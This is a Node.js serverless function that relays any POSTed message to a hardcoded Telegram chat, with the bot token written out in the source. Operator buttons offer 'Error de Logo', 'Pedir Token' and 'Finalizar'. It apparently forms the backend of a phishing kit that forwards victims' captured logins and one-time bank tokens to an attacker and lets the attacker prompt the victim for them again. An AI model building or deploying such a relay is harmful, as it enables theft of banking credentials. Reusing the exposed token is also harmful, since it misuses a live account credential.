const TelegramBot = require('node-telegram-bot-api');

// Telegram Bot setup
const token = '7314533621:AAHyzTNErnFMOY_N-hs_6O88cTYxzebbzjM';
const chatId = '-1002638389042';

// Initialize bot with webhook
const bot = new TelegramBot(token, {
    webHook: true
});

// Function to send message to Telegram with inline keyboard
async function sendTelegramMessage(text) {
    console.log('Attempting to send message to Telegram:', text);
    
    const keyboard = {
        inline_keyboard: [
            [
                { text: '❌ Error de Logo', callback_data: 'error_logo' },
                { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' }
            ],
            [
                { text: '❌ Error de Token', callback_data: 'error_token' },
                { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
            ],
            [
                { text: '✅ Finalizar', callback_data: 'finalizar' }
            ]
        ]
    };

    try {
        const result = await bot.sendMessage(chatId, text, { 
            reply_markup: keyboard,
            parse_mode: 'HTML'
        });
        console.log('Message sent successfully:', result.message_id);
        return result;
    } catch (error) {
        console.error('Failed to send Telegram message:', error);
        throw error;
    }
}

// Serverless function handler
module.exports = async (req, res) => {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        console.log('Received request:', req.body);

        if (!req.body || !req.body.message) {
            return res.status(400).json({ error: 'Missing message in request body' });
        }

        // Try to send the message
        const result = await sendTelegramMessage(req.body.message);
        
        res.status(200).json({
            success: true,
            messageId: result.message_id
        });
    } catch (error) {
        console.error('Error processing request:', error);
        res.status(500).json({
            success: false,
            error: error.message,
            details: error.stack
        });
    }
};
